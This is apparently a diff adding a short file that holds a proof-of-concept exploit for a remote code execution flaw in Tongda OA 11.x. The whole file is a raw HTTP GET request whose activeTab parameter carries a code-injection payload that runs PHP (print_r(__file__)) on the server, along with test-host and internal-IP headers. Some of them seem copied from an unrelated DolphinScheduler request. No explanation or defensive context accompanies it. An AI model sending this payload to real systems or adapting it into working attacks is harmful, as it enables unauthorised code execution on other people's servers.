@@ -1,0 +1,13 @@
+# 通达OA 11.x远程代码执行漏洞
+GET /general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eprint_r(__file__))%3B/*&id=19&module=Carouselimage HTTP/1.1
+Host: www.xwd_test.com
+Accept: application/json, text/plain, */*
+sessionId: 338d2a47-ed61-4fc5-9868-5c8b0c57dec5
+language: zh_CN
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
+Origin: http://172.18.178.167:12345
+Referer: http://172.18.178.167:12345/dolphinscheduler/ui/datasource
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+
